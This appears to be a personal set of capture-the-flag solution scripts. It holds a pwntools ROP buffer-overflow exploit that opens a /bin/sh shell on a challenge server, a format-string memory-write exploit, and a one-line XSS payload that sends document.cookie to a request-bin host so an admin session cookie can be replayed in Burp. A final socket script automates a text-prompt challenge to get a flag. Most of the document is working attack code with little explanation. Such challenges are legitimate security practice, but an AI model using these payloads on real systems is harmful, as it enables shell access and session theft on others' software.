Buffer overflow script 1

from pwn import *
#connections
#io = process("./intro-pwn")
io = process(["ncat", "--ssl-verify", "8eabc9018ee7a886c929aaf1-1024-intro-pwn-1.challenge.cscg.live", "1337"])

#add ncat process here after testing

#addresses found with gdb
pop_rdi         = 0x401205      #ROPgadget --binary ./intro-pwn | grep "pop rdi"
system_addr     = 0x401040      #objdump -d ./intro-pwn | grep system
data_addr       = 0x404028      #readelf -S ./intro-pwn | grep .data
gets_addr       = 0x401060      #objdump -d ./intro-pwn | grep gets@plt

#payload
payload = b"A" * 24 #offset

#write "/bin/sh" to .data section
payload += p64(pop_rdi)         #sets rdi to the address of .data
payload += p64(data_addr)
payload += p64(gets_addr)       #use gets() to write "/bin/sh" to .data

#call system("/bin/sh")

payload += p64(pop_rdi)      # Set RDI to the address of "/bin/sh"
payload += p64(data_addr)
payload += p64(system_addr)  # Call system()

io.sendline(payload)
io.sendline(b"/bin/sh")      # Provide "/bin/sh" as input
io.interactive()


################################################################################################


Format String script 1

from pwn import *

context.arch =  "amd64"         #found in file enumeration

bug_addr =      0x40406c        # nm ./intro-fmt | grep bug

def send_payload(payload):
        #r = process("./intro-fmt") #local
        r = remote("656c9c6df8d1a3d13267d8f1-1024-intro-pwn-2.challenge.cscg.live", 1337, ssl=True) #remote
        log.info(f"Payload: {repr(payload)}")
        r.sendlineafter(b"What is your name?\n", payload)
        output = r.recvall()
        log.info(f"Output: {output.decode()}")
        r.close()
        return output

#create format string object
format_string = FmtStr(execute_fmt=send_payload)

#use the object to write value 1 to bug
format_string.write(bug_addr, 1)

#execute the writes
format_string.execute_writes()

################################################################################

Grab session cookie
<script>window.location.replace("https://requestbin.kanbanbox.com/XXXXXXX?" + document.cookie)</script>
        set up request bin and grab admin cookie.. then user repeater in burp to change the cookie

################################################################################

#!/usr/local/bin/python
import socket
import time

# Comments to add with their intended line numbers in the original script
comments = [
    (0, "Function to check if a string is a palindrome"),
    (2, "Initialize result as True, assuming the string is a palindrome"),
    (3, "Loop through half the string to compare characters"),
    (5, "Get character from the start of the string"),
    (6, "Get corresponding character from the end of the string"),
    (7, "Compare characters; if they differ, mark as not a palindrome"),
    (9, "Return whether the string is a palindrome"),
    (10, "Prompt user for a word to check"),
    (11, "Check if the input word is a palindrome and print result")
]

# Adjust line numbers to account for inserted comments
adjusted_lines = []
current_line = 0
line_map = {0: 0}  # Maps original line to adjusted line after insertions
for orig_line, _ in comments:
    # Find the adjusted line number for the original line
    adjusted_line = orig_line
    for prev_line, _ in adjusted_lines:
        if prev_line <= adjusted_line:
            adjusted_line += 1
    adjusted_lines.append((adjusted_line, orig_line))
    line_map[orig_line] = adjusted_line

# Connect to the server
host = "74.207.229.59"
port = 20240
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Receive and print server output
def receive_output():
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if b"add more? [y/N]: " in data or b"Enter a word to check if it's a palindrome: " in data:
            break
        time.sleep(0.1)
    print(data.decode(errors="ignore"))
    return data.decode(errors="ignore")

# Send input to server
def send_input(text):
    s.send((str(text) + "\n").encode())
    time.sleep(0.5)

# Automate comment insertion
for adjusted_line, (orig_line, comment) in enumerate(comments):
    # Receive initial output or prompt
    receive_output()
    
    # Send line number
    send_input(adjusted_line)
    
    # Send comment
    send_input(comment)
    
    # After the first comment, we need to confirm to add more
    if adjusted_line < len(comments) - 1:
        receive_output()
        send_input("y")
    else:
        receive_output()
        send_input("N")

# Handle the palindrome input prompt
receive_output()
send_input("radar")  # Test with a palindrome

# Receive final output (possibly containing the flag)
final_output = receive_output()
print("Final output:")
print(final_output)

# Close connection
s.close()
